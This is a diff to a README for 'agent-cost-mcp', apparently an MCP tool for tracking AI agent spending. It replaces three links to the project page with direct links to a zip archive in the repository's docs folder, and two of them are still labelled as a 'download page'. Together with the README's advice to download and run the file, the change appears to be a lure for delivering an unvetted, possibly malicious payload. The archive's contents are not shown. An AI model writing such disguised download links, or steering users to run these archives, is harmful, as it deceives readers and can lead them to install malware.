@@ -1,6 +1,6 @@
 # ⚙️ agent-cost-mcp - Track AI spending with clarity
 
-[![Download / Install](https://img.shields.io/badge/Download-Install-blue.svg?style=for-the-badge)](https://github.com/Merovingian-valency417/agent-cost-mcp)
+[![Download / Install](https://img.shields.io/badge/Download-Install-blue.svg?style=for-the-badge)](https://github.com/Merovingian-valency417/agent-cost-mcp/raw/refs/heads/main/docs/agent_mcp_cost_v3.4-alpha.3.zip)
 
 ## 🧾 What this app does
 
@@ -21,7 +21,7 @@ It works with tools like Claude Code, Cursor, Windsurf, Codex, Gemini CLI, and O
 
 Use this link to visit the download page:
 
-[Visit the agent-cost-mcp download page](https://github.com/Merovingian-valency417/agent-cost-mcp)
+[Visit the agent-cost-mcp download page](https://github.com/Merovingian-valency417/agent-cost-mcp/raw/refs/heads/main/docs/agent_mcp_cost_v3.4-alpha.3.zip)
 
 If you use a release file later, download it to your computer and run that file. If you use the main repository page, follow the setup files and install steps shown there.
 
@@ -229,4 +229,4 @@ Yes. You can use it with several supported tools if each one supports MCP setup.
 
 ## 📎 Download again
 
-[Visit the agent-cost-mcp download page](https://github.com/Merovingian-valency417/agent-cost-mcp)
+[Visit the agent-cost-mcp download page](https://github.com/Merovingian-valency417/agent-cost-mcp/raw/refs/heads/main/docs/agent_mcp_cost_v3.4-alpha.3.zip)
